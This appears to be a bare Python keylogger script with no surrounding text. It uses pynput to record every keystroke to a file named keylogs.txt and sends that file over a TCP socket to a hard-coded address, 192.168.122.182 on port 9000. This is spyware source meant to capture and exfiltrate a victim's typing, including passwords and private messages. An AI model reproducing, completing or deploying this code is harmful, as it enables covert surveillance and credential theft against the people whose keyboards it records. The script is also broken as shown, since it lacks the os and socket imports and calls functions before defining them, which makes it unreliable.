import pynput

script_dir = os.path.dirname(os.path.abspath(__file__))
filename = os.path.join(script_dir, 'keylogs.txt')

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()

transmit_file(filename)

def on_press(key):
    with open(filename, 'a') as f:
        if key == pynput.keyboard.Key.space:
            f.write(' ')  
        else:
            f.write(str(key))  

def transmit_file(filename):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('192.168.122.182', 9000))
        with open(filename, 'rb') as f:
            s.sendall(f.read())
